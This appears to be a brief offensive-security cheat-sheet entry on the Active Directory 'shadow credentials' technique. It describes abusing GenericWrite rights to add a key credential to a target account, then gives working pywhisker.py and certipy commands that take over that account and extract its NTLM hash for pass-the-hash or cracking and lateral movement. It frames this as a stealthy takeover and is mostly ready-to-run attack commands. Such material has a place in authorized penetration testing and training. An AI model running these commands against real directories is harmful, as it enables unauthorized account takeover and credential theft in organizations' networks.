**If you have "GenericWrite" over a user or computer** (BloodHound shows this as an edge), you can quietly add your own certificate-style key to that account, then use it to log in _as them_ — without ever knowing or changing their password. It's a stealthy takeover of any account you have write access to.

```
# Requires: GenericWrite on target user/computer
# Check in BloodHound: GenericWrite edges on users or computers

# Add shadow credential to target:
pywhisker.py -d corp.local -u stephanie -p 'Password123' \
    --target targetuser --action add --dc-ip 192.168.x.100
# Gets: pfx file + password

# Authenticate with pfx → get NTLM hash:
certipy auth -pfx targetuser.pfx -dc-ip 192.168.x.100
# NTLM hash → PTH or crack → lateral movement
```